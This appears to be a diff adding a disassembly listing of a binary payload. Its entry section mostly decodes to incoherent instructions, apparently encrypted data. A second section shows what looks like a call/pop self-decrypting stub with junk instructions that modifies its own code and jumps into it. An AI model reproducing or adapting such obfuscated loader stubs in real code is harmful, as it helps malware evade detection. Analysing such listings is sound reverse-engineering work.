@@ -1,0 +1,121 @@
+=== payload entry ===
+00000000  call      0x4737
+00000005  mov       edx, 0xef0fd7df
+0000000A  jbe       0xffffffffffffffc3
+0000000C  xchg      esp, eax
+0000000D  iretd     
+0000000E  and       al, cl
+00000010  .byte     0xd6
+00000011  mov       rcx, 0xffffffff9239980e
+00000018  dec       dword ptr [rbp + 0x91d]
+0000001E  add       byte ptr [rax + rsi + 0x34], al
+00000022  or        eax, dword ptr [rdx + rax + 0x34]
+00000026  or        esp, edx
+00000028  neg       byte ptr [rsi - 0x29fe9397]
+0000002E  js        0x2c
+00000030  xor       dword ptr [rdx - 0x4e08b7a2], edi
+00000036  mov       cl, 0x29
+00000038  pop       rdx
+00000039  push      rcx
+0000003A  retf      
+0000003B  movsb     byte ptr [rdi], byte ptr [rsi]
+0000003C  test      dword ptr [rip + 0x377f972f], ebp
+00000042  .byte     0x8f
+00000043  pop       rbx
+00000044  sub       dh, byte ptr [rdx + rdi*8 - 0x139a9279]
+0000004B  pop       rbx
+0000004C  push      rbx
+0000004D  .byte     0xd6
+0000004E  out       0xb2, al
+00000050  xor       byte ptr [rcx + 0x6b], dh
+00000053  xchg      qword ptr [r9 + 0x3a5df96f], r11
+0000005A  mov       ecx, 0x37441f38
+0000005F  add       bl, ch
+00000061  and       ebx, dword ptr [rsi + 0xe6e8f14]
+00000067  cmp       al, 0x85
+00000069  jns       0xe9
+0000006C  mov       ecx, 0xf0db8d97
+00000071  push      rdx
+00000072  .byte     0x8d
+00000073  xlatb     
+00000074  sub       al, 0x5b
+00000076  in        al, dx
+00000077  stosd     dword ptr [rdi], eax
+00000078  adc       eax, 0x8ba3d3d2
+0000007D  jno       0x7b
+0000007F  xor       byte ptr [rdx + 0x33143384], al
+00000085  .byte     0xc7
+00000086  xchg      esp, eax
+00000087  sbb       al, 0xf0
+0000008B  sar       byte ptr [rbx - 0x16782b59], 0x6b
+00000092  repne lodsd eax, dword ptr [rsi]
+00000094  jno       0xb7
+00000096  cld       
+00000097  retf      0x607a
+0000009A  test      al, 0xd1
+0000009C  movsb     byte ptr [rdi], byte ptr [rsi]
+0000009D  or        byte ptr [rcx + rbp*8], cl
+000000A0  movsxd    edi, ecx
+000000A2  mov       edi, 0x18a0d809
+000000A7  .byte     0x16
+000000A8  push      rbp
+000000A9  mov       bl, 0xdd
+000000AB  cdq       
+000000AC  fst       dword ptr [rbp - 0x41]
+000000AF  pushfq    
+000000B0  out       dx, al
+000000B2  push      rdi
+000000B3  mov       esi, 0xd909e62b
+000000B8  mov       eax, 0xdbfe77a4
+000000BD  loop      0x106
+000000BF  cmp       al, 0x33
+000000C1  jl        0xff
+000000C3  imul      ebp, dword ptr [rcx - 0x3087d0b2], 0xa4a01ae2
+000000CD  out       0x38, eax
+000000CF  retf      
+000000D1  .byte     0xfe
+000000D2  sar       byte ptr [rbx - 0x411dcc2d], 1
+000000D8  adc       byte ptr [rbp + 0x1f], ah
+000000DB  or        esi, dword ptr [rdi]
+000000DD  out       dx, al
+000000DE  int1      
+000000DF  .byte     0x8f
+000000E0  or        r10, qword ptr [rcx + r11*4]
+000000E4  mov       eax, ebx
+000000E6  xor       rsi, qword ptr [rcx - 0xe684459]
+000000ED  movsxd    eax, ebx
+000000EF  xor       edi, dword ptr [rbp - 0x122a6801]
+000000F5  .byte     0x07
+000000F6  push      rcx
+000000F7  sbb       eax, 0x2aa42fc6
+000000FC  .byte     0x8d
+000000FD  .byte     0xea
+000000FE  rdpmc     
+
+=== initial call target 0x4737 ===
+00004737  cmovge    r9, r9
+0000473B  jmp       0x4744
+0000473D  adc       dword ptr [rax + 0x73], 0xdbcc6e8d
+00004744  pop       rax
+00004745  jmp       0x474e
+00004747  xchg      r11d, eax
+00004749  .byte     0xc7
+0000474A  adc       byte ptr [rdi - 0x3e], cl
+0000474D  or        al, 0xc1
+0000474F  add       byte ptr [rdi - 0x2703f815], cl
+00004755  hlt       
+00004756  and       eax, 0x81359d6e
+0000475B  add       al, 0x2e
+0000475E  push      -4
+00004760  sahf      
+00004761  cmovl     rsi, rsi
+00004765  ror       dword ptr [rax + 8], 5
+00004769  ror       dword ptr [rax + 0xc], 0xe0
+0000476D  jmp       0x4776
+0000476F  .byte     0xf3
+00004770  .byte     0x37
+00004771  jbe       0x473a
+00004773  cmp       al, 0x7c
+00004776  cmovne    r13, r13
+0000477A  add       dword ptr [rax + 0x10], 0x486dc6af
+00004781  jmp       rax
